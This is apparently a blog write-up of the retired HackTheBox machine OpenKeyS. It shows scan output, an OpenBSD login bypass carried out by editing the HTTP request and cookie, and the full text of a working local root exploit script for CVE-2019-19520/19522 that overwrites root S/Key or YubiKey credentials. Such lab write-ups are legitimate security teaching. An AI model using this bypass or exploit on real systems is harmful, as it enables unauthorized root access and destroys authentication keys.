---
author: "faizul"
title: "OpenKeyS - Retired HackTheBox Machine"
date: 2020-12-19T12:00:06+09:00
description: "OpenKeyS Machine Writeup"
draft: false
hideToc: false
enableToc: true
enableTocContent: false
author: faizul
image: images/htb/htb.png
tags: 
- pentest
- retired
- hackthebox
- OpenBSD
categories:
- writeup
---


OpenKeyS Machine




![dd714c46dc8f5296ce9c00aa105c00b3.png](/images/htb/openkeys/00a98b4b0a084c7385b1c8d36ce7c30a.png)


## Recon

### Autorecon
For this machine, i try to fully utilize autorecon to speed up and automate my recon process. Basically, this script will scan the open port and scan related services using tools e.g nikto, dirsearch, dirbuster, whatweb. 

#### Nmap
```nmap
# Nmap 7.80 scan initiated Mon Aug 31 11:32:54 2020 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /mnt/hgfs/CyberSec/Playground/HackTheBox/Active/Openkeys/results/10.10.10.199/scans/_full_tcp_nmap.txt -oX /mnt/hgfs/CyberSec/Playground/HackTheBox/Active/Openkeys/results/10.10.10.199/scans/xml/_full_tcp_nmap.xml 10.10.10.199
Increasing send delay for 10.10.10.199 from 0 to 5 due to 48 out of 159 dropped probes since last increase.
Nmap scan report for 10.10.10.199
Host is up, received user-set (0.27s latency).
Scanned at 2020-08-31 11:32:55 EDT for 3024s
Not shown: 65533 closed ports
Reason: 65533 conn-refused
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 5e:ff:81:e9:1f:9b:f8:9a:25:df:5d:82:1a:dd:7a:81 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDe8l1l+kUpCKDTLXtOj9CY1xcde98zhpP0ANXSj7eI2KRVQuOpowxjzNf/NrDoIffaCtsNY36nnVw5JDbX2zU0+wKeMEoVHBlelNSneBHrYv4CuhlO7ll6tHZcs0kWSvFk8nipNTYXSm48EhFbspsC89Yv7REeRFq+uE1unEo8d+Dt2MmDzNnu+QtATp4wlSE1LIROq7cDRsR10S5j6fnaRbEYGquXSJkW6sV6PTZhGm8y6sXXQ3RynYJ129m5YTevg4fKpF/FkfEuPn5sRIj+aZCT6GjP9WEae+R/6lVEcMOmuq9K9CCqoGuwGakoK+m/upQDlI7pXcN8359a7XcMXSgriJIjV8yv350JsdLqIN704w5NLowAaInYPqXKNrXdxa5olprzF1dMlN0ClvV96tX9bg2ERrRhrLbSOZudrqefMNjSKqdNWLh7AQh8TnwdDMdXf/IOat1CjQMNwPTi3XkklU+Lm92J8Nd6gO8uLd6HuRLPVxUqJp6hKwLIbHM=
|   256 64:7a:5a:52:85:c5:6d:d5:4a:6b:a7:1a:9a:8a:b9:bb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOM044THRHSb9MKRgg+pCGqLErFIOMaaGjCwwSpxVFsdQWW9kg3fROwqwtNVM1McgJ4Y4NwVzl+w5DZGK2OdhNE=
|   256 12:35:4b:6e:23:09:dc:ea:00:8c:72:20:c7:50:32:f3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIKuJoZTZonWY0/JkBfYeM2POVzE/TZfUJGA10PMXB1s
80/tcp open  http    syn-ack OpenBSD httpd
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 31 12:23:20 2020 -- 1 IP address (1 host up) scanned in 3025.84 seconds
```


#### Nikto
```nikto
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.199
+ Target Hostname:    10.10.10.199
+ Target Port:        80
+ Start Time:         2020-08-31 11:33:54 (GMT-4)
---------------------------------------------------------------------------
+ Server: OpenBSD httpd
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/7.3.13
+ Cookie PHPSESSID created without the httponly flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Multiple index files found: /index.html, /index.php
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /includes/: Directory indexing found.
+ OSVDB-3092: /includes/: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ 7865 requests: 2 error(s) and 11 item(s) reported on remote host
+ End Time:           2020-08-31 12:39:10 (GMT-4) (3916 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

#### Gobuster
```gobuster
/css (Status: 301) [Size: 443]
/fonts (Status: 301) [Size: 443]
/images (Status: 301) [Size: 443]
/includes (Status: 301) [Size: 443]
/index.php (Status: 200) [Size: 4837]
/index.html (Status: 200) [Size: 96]
/index.html (Status: 200) [Size: 96]
/index.php (Status: 200) [Size: 4837]
/js (Status: 301) [Size: 443]
/vendor (Status: 301) [Size: 443]
```

#### /includes folder


![15b3f51556e2f43ae4728e45ea609f3c.png](/images/htb/openkeys/7640fd449e654f89a8dfbc193de037b7.png)

Rabbit hole
- `vim -r auth.php.swp` to recover unix swap file 


![5ba5fc84b41fd97b04fba0c7abd96e24.png](/images/htb/openkeys/792b506690e34a00a058492da1ce5fcc.png)





## Initial Access
For initial access / initial foothold, we need to understand how the authentication work, OS and CVE used for this machine. 

Open .swp on browser
![0f789721d2367f5d2679c8ea3ca23839.png](/images/htb/openkeys/66cbe7188f0242729a3b528dfc3c4d17.png)

Save file from `../auth_helpers/check_auth`

Then use strings command to get important information.
![b4d2580fbeccffc66bc17db69f2845f4.png](/images/htb/openkeys/64fb4d8a33b64241ad2d6098a4c1be64.png)


This brings us [here](https://blog.qualys.com/laws-of-vulnerabilities/2019/12/04/openbsd-multiple-authentication-vulnerabilities) then we can summarise that the web app using vulnerable openbsd auth_userokay CVE-2019-19520. For the exploit POC, we can visit [Qualys CVE Research findings](https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt?_ga=2.58244398.587934852.1575530822-682141427.1570559125)


Just like mentioned on POC, ssh have its own mechanism to combat this but the attempt show that this machine vulnerable to the CVE
![4758529df53dec3139eb07bad95f113d.png](/images/htb/openkeys/c4201c0e67084a1f9fc91c8b89a32ec8.png)


We need to find another way because ssh didnt work. Lets take a look back at the web title. It says retrieve openkeys. We try to use `-schallenge:passwd` on the login page.

![07b7478cab7678da2c19726b93c5220d.png](/images/htb/openkeys/15697ddeb21c481692d3d53d1f880006.png)

Then intercept it using burpsuite
![0eb5012eb9c0c844500963283e6817b3.png](/images/htb/openkeys/0a3040ed39654feb8a67d6fd97429887.png)

change the request to include username `jennifer`

```http
POST /index.php HTTP/1.1
Host: openkeys.htb
Content-Length: 59
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://openkeys.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://openkeys.htb/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=ilaa6vn1intngu7cg4om4hnokj;username=jennifer
Connection: close

username=-schallenge%3Apasswd&password=-schallenge%3Apasswd
```
This then will display SSH key for jennifer on the ssh.php

![017789b3e831b94d118c220ffb2d001b.png](/images/htb/openkeys/6ded2e40d5014378909726a87e3993d7.png)


Save the key using `nano` or `vim` then ssh to the machine using `ssh -i ssh-key jennifer@openkeys.htb`
![170f7338245f07cc99f9ceae60519998.png](/images/htb/openkeys/1099cfbc8053488e9156c5544d2c633a.png)




## Privilege Escalation

**CVE-2019-19520**

The first attempt made is by hosting code using python webserver and on victim i curl the script the pipe it to sh. It didnt work because it need local execution. 

`cd /tmp && mkdir fyezool`


`nano exploit.sh`

```bash
#!/bin/sh
# openbsd-authroot - OpenBSD local root exploit for CVE-2019-19520 and CVE-2019-19522
# Code mostly stolen from Qualys PoCs:
# - https://www.openwall.com/lists/oss-security/2019/12/04/5
#
# Uses CVE-2019-19520 to gain 'auth' group permissions via xlock;
# and CVE-2019-19520 to gain root permissions via S/Key or YubiKey
# (requires S/Key or YubiKey authentication to be enabled).
# ---
# $ ./openbsd-authroot
# openbsd-authroot (CVE-2019-19520 / CVE-2019-19522)
# [*] checking system ...
# [*] system supports YubiKey authentication
# [*] id: uid=1002(test) gid=1002(test) groups=1002(test)
# [*] compiling ...
# [*] running Xvfb ...
# [*] testing for CVE-2019-19520 ...
# (EE) 
# Fatal server error:
# (EE) Server is already active for display 66
#         If this server is no longer running, remove /tmp/.X66-lock
#         and start again.
# (EE) 
# [+] success! we have auth group permissions
#
# WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL (CTRL+C).
#
# [*] trying CVE-2019-19522 (YubiKey) ...
# Your password is: krkhgtuhdnjclrikikklulkldlutreul
# Password:
# ksh: /etc/profile[2]: source: not found
# # id                                                                                                                                                                                    
# uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
# ---
# 2019-12-06 - <bcoles@gmail.com>
# https://github.com/bcoles/local-exploits/tree/master/CVE-2019-19520

echo "openbsd-authroot (CVE-2019-19520 / CVE-2019-19522)"

echo "[*] checking system ..."

if grep auth= /etc/login.conf | fgrep -Ev "^#" | grep -q yubikey ; then
  echo "[*] system supports YubiKey authentication"
  target='yubikey'
elif grep auth= /etc/login.conf | fgrep -Ev "^#" | grep -q skey ; then
  echo "[*] system supports S/Key authentication"
  target='skey'
  if ! test -d /etc/skey/ ; then
    echo "[-] S/Key authentication enabled, but has not been initialized"
    exit 1
  fi
else
  echo "[-] system does not support S/Key / YubiKey authentication"
  exit 1
fi

echo "[*] id: `id`"

echo "[*] compiling ..."

cat > swrast_dri.c << "EOF"
#include <paths.h>
#include <sys/types.h>
#include <unistd.h>
static void __attribute__ ((constructor)) _init (void) {
    gid_t rgid, egid, sgid;
    if (getresgid(&rgid, &egid, &sgid) != 0) _exit(__LINE__);
    if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);
    char * const argv[] = { _PATH_KSHELL, NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}
EOF

cc -fpic -shared -s -o swrast_dri.so swrast_dri.c
rm -rf swrast_dri.c

echo "[*] running Xvfb ..."

display=":66"

env -i /usr/X11R6/bin/Xvfb $display -cc 0 &

echo "[*] testing for CVE-2019-19520 ..."

group=$(echo id -gn | env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display $display)

if [ "$group" = "auth" ]; then
  echo "[+] success! we have auth group permissions"
else
  echo "[-] failed to acquire auth group permissions"
  exit 1
fi

# uncomment to drop to a shell with auth group permissions
#env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display $display ; exit

echo
echo "WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL (CTRL+C)."
echo
sleep 5

if [ "$target" = "skey" ]; then
  echo "[*] trying CVE-2019-19522 (S/Key) ..."
  echo "rm -rf /etc/skey/root ; echo 'root md5 0100 obsd91335 8b6d96e0ef1b1c21' > /etc/skey/root ; chmod 0600 /etc/skey/root" | env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display $display
  rm -rf swrast_dri.so
  echo "Your password is: EGG LARD GROW HOG DRAG LAIN"
  env -i TERM=vt220 su -l -a skey
fi

if [ "$target" = "yubikey" ]; then
  echo "[*] trying CVE-2019-19522 (YubiKey) ..."
  echo "rm -rf /var/db/yubikey/root.* ; echo 32d32ddfb7d5 > /var/db/yubikey/root.uid ; echo 554d5eedfd75fb96cc74d52609505216 > /var/db/yubikey/root.key" | env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display $display
  rm -rf swrast_dri.so
  echo "Your password is: krkhgtuhdnjclrikikklulkldlutreul"
  env -i TERM=vt220 su -l -a yubikey
fi
```

## Findings and summary
- Rabbit hole is true, as it is worse in real life application
- Enumerate and get to know the victim better. OSINT is the key word
- BSD machine is one tough machine to break, get to know the CVE properly, understand it then try to epxloit
- Paste SSH key using `nano` or `vim`
- If exploit on remote is not success, try to save the file locally or read CVE properly because it says `local exploit`
- There is more than one way to send exploit besides ssh. Censys use ssh to do demo but this machine is called retrieve open ssh keys and use web to retrieve keys then ssh
- TLDR for the whole machine is recon services -> found /includes -> open .swp file on web -> get jennifer as username -> get /auth_helpers/check_auth -> strings check_auth -> auth_userokay -> use -schallenge:passwd for login -> intercept with burpsuite -> change phpsession line to add ;username=jennifer -> get ssh_key -> save it to local -> ssh -i 'ssh_key' as jennifer -> get user.txt -> use cve-2019-19520 -> save exploit to local & run -> get root
- https://github.com/bcoles/local-exploits
